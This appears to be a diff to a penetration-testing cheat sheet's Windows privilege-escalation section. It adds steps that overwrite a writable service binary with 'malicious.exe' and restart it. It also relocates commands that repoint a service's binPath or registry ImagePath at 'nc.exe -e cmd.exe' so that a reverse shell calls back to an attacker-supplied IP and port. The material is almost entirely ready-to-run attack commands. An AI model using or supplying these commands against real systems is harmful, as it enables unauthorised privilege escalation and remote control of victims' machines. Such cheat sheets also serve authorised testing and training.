@@ -1876,9 +1876,19 @@ $ find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
 C:\> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 ```
 
-- Weak Service
+- Weak Service (Binary Replacement)
 
 ```
+C:\> .\SharpUp.exe audit
+C:\> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+C:\> cmd /c copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+C:\> sc start SecurityService
+```
+
+```
+C:\> sc.exe config <service> binPath=C:\Windows\Temp\nc.exe -e cmd.exe <IP address> <port>"
+C:\> sc.exe stop <service>
+C:\> sc.exe start <service>
 C:\> accesschk.exe /accepteula "<username>" -kvuqsw hklm\System\CurrentControlSet\services
 C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\<username>\Downloads\nc.exe -e cmd.exe <IP address> <port>"
 ```
@@ -2015,14 +2025,6 @@ https://github.com/rasta-mouse/Watson
 
 ```
 https://github.com/bitsadmin/wesng
-```
-
-- Weak Service
-
-```
-C:\> sc.exe config <service> binPath=C:\Windows\Temp\nc.exe -e cmd.exe <IP address> <port>"
-C:\> sc.exe stop <service>
-C:\> sc.exe start <service>
 ```
 
 - Cron Jobs
